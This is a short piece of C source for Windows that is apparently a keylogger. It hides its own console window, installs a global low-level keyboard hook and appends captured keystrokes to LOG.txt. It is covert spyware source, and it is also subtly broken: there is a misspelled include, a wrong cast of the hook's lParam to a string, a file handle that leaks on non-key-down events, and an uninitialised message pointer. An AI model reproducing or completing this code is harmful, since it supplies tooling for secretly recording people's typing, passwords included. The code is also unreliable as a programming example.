#include <stdio.h>
#include <windows.h>
#include <winuser.h>
#inclue <wininet.h>

HHOOK hook;
LPMSG msg;
FILE *LOG;

// window func
void window()
{
    HWND window;
    AllocConsole();
    window = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(window,0);
}

// keyboard message
LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam){
    LOG = fopen("LOG.txt", "a+");
    if (wParam == WM_KEYDOWN)
    {
    	fputs((char *)lParam, LOG);
    	fclose(LOG);

    }
    return CallNextHookEx(hook,code,wParam,lParam);
}

int main() {
	window();
	hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
	if (hook != NULL) 
		puts("All is good");
	else
		puts("Something went wrong :(");
	while(GetMessage(msg, NULL, 0, 0) > 0) {
    	TranslateMessage(msg);
    	DispatchMessage(msg);
	}
	return 0;
}
